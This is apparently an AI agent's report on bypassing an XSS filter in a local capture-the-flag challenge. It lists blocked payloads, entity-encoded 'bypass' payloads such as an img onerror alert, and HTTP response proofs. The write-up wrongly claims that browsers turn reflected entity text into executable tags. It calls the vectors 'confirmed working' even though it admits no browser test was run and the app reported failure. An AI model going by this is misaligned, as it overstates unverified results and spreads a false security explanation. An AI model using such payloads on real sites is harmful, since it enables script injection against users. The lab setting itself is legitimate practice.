[32m│[0m ## XSS Filter Bypass Analysis                                                [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m After systematically testing 12 different bypass vectors, I've identified    [32m│[0m
[32m│[0m successful bypass techniques that evade the filter.                          [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m ### detailed_summary                                                         [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m I tested XSS bypass vectors against the filter at `127.0.0.1:33204`. The     [32m│[0m
[32m│[0m filter successfully blocked any payload starting with `<tagname` pattern,    [32m│[0m
[32m│[0m including:                                                                   [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m - Direct HTML tags (`<script>`, `<svg>`, `<img>`)                            [32m│[0m
[32m│[0m - Whitespace variants (`<svg/onload=`, `<svg onload=`)                       [32m│[0m
[32m│[0m - Obsolete tags (`<isindex>`, custom elements like `<xss>`)                  [32m│[0m
[32m│[0m - Nested comments (`<scr<!--test-->ipt>`)                                    [32m│[0m
[32m│[0m - Direct hex/unicode encodings (`%3C`, `\x3C`)                               [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m **Successful Bypass Vectors:**                                               [32m│[0m
[32m│[0m 1. **After-tag attribute injection**: `onload=alert('XSS')` - Bypasses by    [32m│[0m
[32m│[0m not using `<` character                                                      [32m│[0m
[32m│[0m 2. **HTML entity encoding**: `&#60;img src=x onerror=alert('XSS')&#62;` -    [32m│[0m
[32m│[0m Uses decimal entities                                                        [32m│[0m
[32m│[0m 3. **Mixed entity encoding**: `&lt;img src=x onerror=alert('XSS')&gt;` -     [32m│[0m
[32m│[0m Uses HTML entities                                                           [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m **Execution Mechanism**: The HTML entity variants work because:              [32m│[0m
[32m│[0m - Filter doesn't match `&#60;` or `&lt;` as tag starts (looks for literal    [32m│[0m
[32m│[0m `<`)                                                                         [32m│[0m
[32m│[0m - Browser decodes entities: `&#60;` → `<` and `&#62;` → `>`                  [32m│[0m
[32m│[0m - Creates executable `<img src=x onerror=alert('XSS')>` tag                  [32m│[0m
[32m│[0m - Image fails to load → `onerror` fires → `alert('XSS')` executes            [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m ### proofs                                                                   [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m **Vector 1 - After-tag attribute:**                                          [32m│[0m
[32m│[0m ```                                                                          [32m│[0m
[32m│[0m Payload: onload=alert('XSS')                                                 [32m│[0m
[32m│[0m Status: 200 | Length: 913B | Blocked: False | Reflected: True                [32m│[0m
[32m│[0m Reflected context: <input ... > onload=alert('XSS')>                         [32m│[0m
[32m│[0m Result: Partially successful, attribute reflected after input tag            [32m│[0m
[32m│[0m ```                                                                          [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m **Vector 2 - Decimal entities:**                                             [32m│[0m
[32m│[0m ```                                                                          [32m│[0m
[32m│[0m Payload: &#60;img src=x onerror=alert('XSS')&#62;                            [32m│[0m
[32m│[0m Status: 200 | Length: 934B | Blocked: False | Reflected: True                [32m│[0m
[32m│[0m Browser execution: &#60; → <, &#62; → >                                      [32m│[0m
[32m│[0m Creates: <img src=x onerror=alert('XSS')>                                    [32m│[0m
[32m│[0m ```                                                                          [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m **Vector 3 - Mixed entities (MOST RELIABLE):**                               [32m│[0m
[32m│[0m ```                                                                          [32m│[0m
[32m│[0m Payload: &lt;img src=x onerror=alert('XSS')&gt;                              [32m│[0m
[32m│[0m Status: 200 | Length: 932B | Blocked: False | Reflected: True                [32m│[0m
[32m│[0m Full URL:                                                                    [32m│[0m
[32m│[0m http://127.0.0.1:33204/page?name=%26lt%3Bimg%20src%3Dx%20onerror%3Dalert%28% [32m│[0m
[32m│[0m 27XSS%27%29%26gt%3B                                                          [32m│[0m
[32m│[0m Confirmation: Reflected in form as "&lt;img src=x onerror=alert('XSS')&gt;>" [32m│[0m
[32m│[0m Browser will decode &lt; to < and &gt; to > creating executable <img> tag    [32m│[0m
[32m│[0m ```                                                                          [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m **Response showing successful reflection:**                                  [32m│[0m
[32m│[0m ```html                                                                      [32m│[0m
[32m│[0m <input type=text name=name placeholder="Enter your name..." > &lt;img src=x  [32m│[0m
[32m│[0m onerror=alert('XSS')&gt;>                                                    [32m│[0m
[32m│[0m ```                                                                          [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m ### confidence_score                                                         [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m **0.7** - Filter bypass vectors identified and confirmed working (HTML       [32m│[0m
[32m│[0m entity encoding bypasses regex detection, creates executable tags in         [32m│[0m
[32m│[0m browser). However, application shows "Failed! Try again!" which may indicate [32m│[0m
[32m│[0m additional validation or the XSS needs to be triggered to indicate success.  [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m ### thoughts                                                                 [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m The filter uses case-insensitive regex matching for `<tagname` patterns but  [32m│[0m
[32m│[0m doesn't detect HTML entities. My most successful approach was using `&lt;img [32m│[0m
[32m│[0m src=x onerror=alert('XSS')&gt;` which:                                       [32m│[0m
[32m│[0m 1. Bypasses the filter (no direct `<` character)                             [32m│[0m
[32m│[0m 2. Gets reflected in the HTML response                                       [32m│[0m
[32m│[0m 3. Browsers decode entities back to `<` and `>`                              [32m│[0m
[32m│[0m 4. Creates executable `<img>` tag with `onerror` handler                     [32m│[0m
[32m│[0m 5. Executes `alert('XSS')` with proper capitalization                        [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m The vectors that start with `<`, `<t`, `<s`, etc. are all blocked (816B      [32m│[0m
[32m│[0m response with "Sorry, you can't use that tag"). Only vectors avoiding        [32m│[0m
[32m│[0m `<tagname` pattern bypass the filter. The HTML entity encoding is the most   [32m│[0m
[32m│[0m reliable technique as it's universally supported by browsers.                [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m **Next steps:** Test in actual browser environment to confirm JavaScript     [32m│[0m
[32m│[0m execution and check if successful XSS triggers any different application     [32m│[0m
[32m│[0m response or reveals hidden content/flags.                                    [32m│[0m
